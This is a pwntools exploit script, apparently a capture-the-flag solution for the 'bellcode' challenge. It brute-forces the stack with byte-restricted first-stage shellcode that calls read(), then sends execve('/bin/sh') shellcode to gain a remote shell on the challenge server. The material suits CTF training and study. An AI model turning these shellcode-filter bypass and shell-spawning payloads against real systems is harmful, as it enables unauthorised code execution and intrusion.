#!/usr/bin/python3

from pwn import *
from binascii import hexlify

def isvalid(ins, shellcode):
    print("Checking: ", ins, end='\r')
    for i in shellcode:
        if (i%5!=0):
            return 0
    print(ins, " --> ", hexlify(shellcode).decode())
    return 1

def FindInstruction():
    regs_16 = ['al', 'bl', 'cl', 'dl', 'di', 'si']
    regs_32 = ['eax', 'ebx', 'ecx', 'edx', 'edi', 'esi']
    regs_64 = ['rax', 'rbx', 'rcx', 'rdx', 'rdi', 'rsi', 'r8', 'r9', 'r10', 'r11', 'r12']
    regs = [regs_16, regs_32, regs_64]

    ins = f'syscall'
    isvalid(ins, asm(ins, arch='amd64'))

    for i in regs:
        for j in i:
            ins = f'mov {j}, 0'
            isvalid(ins, asm(ins, arch='amd64'))
            ins = f'mov {j}, 0xff'
            isvalid(ins, asm(ins, arch='amd64'))
            ins = f'add {j}, 0xff'
            isvalid(ins, asm(ins, arch='amd64'))
            ins = f'sub {j}, 0xff'
            isvalid(ins, asm(ins, arch='amd64'))
            ins = f'dec {j}'
            isvalid(ins, asm(ins, arch='amd64'))
            ins = f'inc {j}'
            isvalid(ins, asm(ins, arch='amd64'))

    for j in regs[2]:
        ins = f'pop {j}'
        isvalid(ins, asm(ins, arch='amd64'))
        ins = f'push {j}'
        isvalid(ins, asm(ins, arch='amd64'))

if args.FINDINS:
    FindInstruction()
    exit()

exe = ELF('./bellcode', checksec=False)
context.binary = exe
context.log_level = 'info'

for i in range(1, 100):
    # p = process(exe.path)
    p = remote('bellcode.chal.imaginaryctf.org', 1337)
    ######################################################
    ### Stage 1: Executing read(0, 0xfac300, 0xfac300) ###
    ######################################################
    payload = asm(
        'mov esi, 0xfac300\n' + 
        'pop rdi\n'*i +                 # Dunno stack so bruteforce
        'syscall\n'
        , arch='amd64')
    p.sendlineafter(b'shellcode?\n', payload)

    #################################
    ### Stage 2: Modify shellcode ###
    #################################
    import time
    shellcode = asm(
        '''
        mov rax, 0x3b
        mov rdx, 29400045130965551
        push 0
        push rdx
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        syscall
        ''', arch='amd64')

    try:
        time.sleep(0.1)
        p.send(b'A'*(7+i) + shellcode)
        p.interactive()
    except:
        pass

